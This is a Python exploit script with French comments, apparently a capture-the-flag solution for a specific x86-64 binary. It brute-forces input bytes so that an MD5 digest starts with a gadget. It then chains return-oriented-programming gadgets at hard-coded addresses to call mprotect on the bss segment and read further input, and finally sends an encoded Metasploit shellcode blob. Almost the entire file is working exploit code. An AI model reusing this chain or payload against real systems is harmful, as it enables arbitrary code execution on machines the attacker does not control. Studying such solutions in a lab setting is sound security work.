#!/usr/bin/env python3
# Implémentation de la méthode 5 de BRAINSTORMING.md
# Il s'agit de la méthode la plus courte et la plus tricky
import hashlib
import itertools
import multiprocessing
import struct
import sys


###########
# Helpers #
###########


def bruteforce(func, alphabet, length, prefix=b'', suffix=b''):
    for e in itertools.product(alphabet, repeat=length):
        attempt = prefix + bytes(e) + suffix
        if func(attempt):
            return attempt

    return None


def bruteforce_process(args):
    func, c, alphabet, length, prefix, suffix = args
    return bruteforce(func, alphabet, length, prefix + bytes([c]), suffix)


def mbruteforce(func, alphabet, length, prefix=b'', suffix=b'', nproc=None):
    if not nproc:
        nproc = multiprocessing.cpu_count()

    pool = multiprocessing.Pool(nproc)

    for result in pool.imap_unordered(bruteforce_process,
                                      [(func, c, alphabet, length - 1, prefix, suffix) for c in alphabet]):
        if result:
            return result

    return None


class md5_startswith:
    def __init__(self, prefix):
        self.prefix = prefix

    def __call__(self, s):
        m = hashlib.md5(s).digest()
        return m.startswith(self.prefix)


#############
# Constants #
#############


bss = 0x601000

# mov eax, 10; syscall; ret
gadget_mprotect_syscall_ret = 0x400c9c

# mov eax, 0; syscall; ret
gadget_read_syscall_ret = 0x400c84

# pop rdi; ret;
gadget_pop_rdi_ret = 0x4008ea

# pop rsi; pop r15; ret;
gadget_pop_rsi_r15_ret = 0x4008e8

# juste après le mov edx, 0x30
main = 0x400bfc


if __name__ == '__main__':
    # First step
    # ==========
    # On fait d'abord un {pop rax; pop rdx; ret}
    # Cela permet de passer en rop et de faire rdx = 7; mprotect() pour passer bss en rwx
    # Ensuite, on utilise {pop rdx; ret} pour mettre 0xff dans rdx, puis on retourne dans le main

    '''
    59                   	pop    rcx
    5a                   	pop    rdx
    c3                   	ret
    '''
    shellcode = bytes([0x59, 0x5a, 0xc3])

    gadget_pop_rdx_ret = bss + 1 # notre shellcode est un gadget

    # mprotect(bss, 0x1000, RWX)
    ropchain = struct.pack('@Q', 7)
    ropchain += struct.pack('@Q', gadget_mprotect_syscall_ret)
    # main(rdx=0xff)
    ropchain += struct.pack('@Q', gadget_pop_rdx_ret)
    ropchain += struct.pack('@Q', 0xff)
    ropchain += struct.pack('@Q', main)
    assert len(ropchain) == 5 * 8

    # on choisi les 8 derniers octets tel que le md5 commence par notre `shellcode`
    sys.stderr.write('[-] Generating first step payload\n')
    payload = mbruteforce(md5_startswith(shellcode), range(255), 8, prefix=ropchain)
    assert len(payload) == 6 * 8
    sys.stdout.buffer.write(payload)

    # Second step
    # ===========
    # Maintenant, on peut avoir une rop chain de 255 octets
    # On va faire un read(0, shellcode_addr, 7) + jmp shellcode_addr

    '''
    59                   	pop    rcx
    5a                   	pop    rdx
    c3                   	ret
    '''
    shellcode = bytes([0x59, 0x5a, 0xc3])

    shellcode_addr = bss + 0x100

    gadget_pop_rdx_ret = bss + 1 # notre shellcode est un gadget

    # mprotect(bss, 0x1000, RWX)
    ropchain = struct.pack('@Q', 7)
    ropchain += struct.pack('@Q', gadget_mprotect_syscall_ret)

    # read(0, shellcode_addr, 0xff)
    ropchain += struct.pack('@Q', gadget_pop_rdi_ret)
    ropchain += struct.pack('@Q', 0)
    ropchain += struct.pack('@Q', gadget_pop_rsi_r15_ret)
    ropchain += struct.pack('@Q', shellcode_addr)
    ropchain += struct.pack('@Q', 0)
    ropchain += struct.pack('@Q', gadget_pop_rdx_ret)
    ropchain += struct.pack('@Q', 0xff)
    ropchain += struct.pack('@Q', gadget_read_syscall_ret)

    # jmp shellcode_addr
    ropchain += struct.pack('@Q', shellcode_addr)

    assert len(ropchain) <= 255 - 8
    ropchain += b'\x00' * (255 - 8 - len(ropchain))

    # on choisi les 8 derniers octets tel que le md5 commence par notre `shellcode`
    sys.stderr.write('[-] Generating second step payload\n')
    payload = mbruteforce(md5_startswith(shellcode), range(255), 8, prefix=ropchain)
    assert len(payload) == 255
    sys.stdout.buffer.write(payload)

    # Third step
    # ==========
    # Send the fucking shellcode (generated by metasploit)

    payload = (b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef" +
               b"\xff\xff\xff\x48\xbb\x2c\x1d\x38\x54\x00\xc1\xaf\x15\x48" +
               b"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x46\x26\x60" +
               b"\xcd\x48\x7a\x80\x77\x45\x73\x17\x27\x68\xc1\xfc\x5d\xa5" +
               b"\xfa\x50\x79\x63\xc1\xaf\x5d\xa5\xfb\x6a\xbc\x08\xc1\xaf" +
               b"\x15\x03\x7f\x51\x3a\x2f\xb2\xc7\x15\x7a\x4a\x70\xdd\xe6" +
               b"\xce\xaa\x15")
    payload += b'\x00' * (255 - len(payload))

    sys.stderr.write('[-] Generating final shellcode\n')
    assert len(payload) == 255
    sys.stdout.buffer.write(payload)
